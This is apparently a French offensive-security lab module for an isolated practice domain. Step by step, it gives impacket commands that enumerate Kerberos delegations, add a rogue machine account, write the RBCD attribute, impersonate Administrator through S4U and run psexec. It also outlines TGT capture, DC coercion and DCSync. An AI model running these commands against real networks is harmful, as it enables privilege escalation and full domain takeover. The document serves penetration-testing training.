# Build — Exploiter RBCD & délégations (lab isolé GOAD-X)

## Pré-requis
- Un principal avec **GenericWrite/GenericAll** sur une machine cible (via recon/ACL, modules 51/21),
  OU le droit de créer un compte machine (`ms-DS-MachineAccountQuota > 0`). Poste attaquant.

## Étape 1 — Repérer les délégations (recon)
```bash
# Unconstrained / constrained / RBCD via BloodHound ou :
impacket-findDelegation corp.meridian.com/user:'pass' -dc-ip 10.10.0.10
```

## Étape 2 — RBCD : créer un compte machine contrôlé (si quota > 0)
```bash
impacket-addcomputer corp.meridian.com/user:'pass' -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip 10.10.0.10
```

## Étape 3 — Écrire l'attribut RBCD sur la cible
```bash
# Nécessite GenericWrite/GenericAll sur la cible (TARGET$)
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \
  corp.meridian.com/user:'pass' -dc-ip 10.10.0.10
```

## Étape 4 — S4U : obtenir un ticket admin vers la cible
```bash
impacket-getST -spn cifs/target.corp.meridian.com -impersonate Administrator \
  -dc-ip 10.10.0.10 'corp.meridian.com/EVIL$:Evil123!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass target.corp.meridian.com   # accès admin sur la cible
```

## Étape 5 — Unconstrained (principe, combiné module 54)
Sur une machine unconstrained compromise : capturer les TGT (`Rubeus monitor`), puis coercer un DC
(module 54) → TGT du DC → DCSync.

## Vérification
- Accès administratif obtenu sur la cible via le ticket S4U.

## Pièges courants
- Oublier que RBCD exige l'**écriture** de l'attribut (donc une ACL ou un compte machine).
- Horloge (Kerberos).
- Laisser la RBCD en place après l'exercice (nettoyer).
